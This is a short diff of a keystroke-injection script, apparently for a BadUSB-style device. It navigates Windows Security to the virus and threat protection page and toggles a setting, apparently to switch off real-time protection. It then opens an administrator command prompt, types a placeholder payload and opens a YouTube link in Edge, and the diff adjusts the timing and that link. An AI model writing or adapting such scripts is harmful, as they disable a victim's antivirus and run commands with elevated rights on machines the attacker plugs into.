@@ -1,6 +1,7 @@
 win_key
 string virus and threat protection
 enter
+sleep
 tab
 tab
 tab
@@ -9,14 +10,15 @@ enter
 space
 left_arrow
 enter
-powershell
+alt_f4
+sleep
+cmd
 admin_enter
 left_arrow
 enter
 payload
 enter
-minimise
-alt_f4
+sleep
 powershell
-string start microsoft-edge:https://www.youtube.com/watch?v=dQw4w9WgXcQ
+string start microsoft-edge:https://www.youtube.com/watch?v=q-Y0bnx6Ndw
 enter
